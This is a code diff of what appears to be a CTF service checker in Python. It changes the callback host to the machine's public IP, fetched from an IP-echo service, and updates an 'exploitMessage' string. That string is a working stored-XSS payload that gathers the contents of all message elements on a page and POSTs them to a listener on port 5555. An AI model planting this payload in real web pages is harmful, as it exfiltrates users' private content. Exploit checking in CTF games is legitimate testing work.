@@ -19,10 +19,11 @@ from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
-import socket
+import urllib.request
 
+public_ip = urllib.request.urlopen('https://v4.ident.me').read().decode('utf8')
 
-HOST = socket.gethostbyname(socket.gethostname())
+HOST = public_ip
 PORT = 5555
 
 SERVICE_PORT = 3000
@@ -111,7 +112,7 @@ async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
     assert_in(noise, r.text, "noise missing from note")
 
 
-exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://""" + socket.gethostbyname(socket.gethostname()) + """:5555/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
+exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://""" + public_ip + """:5555/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
 result = [None]
 
 webServer = [None]
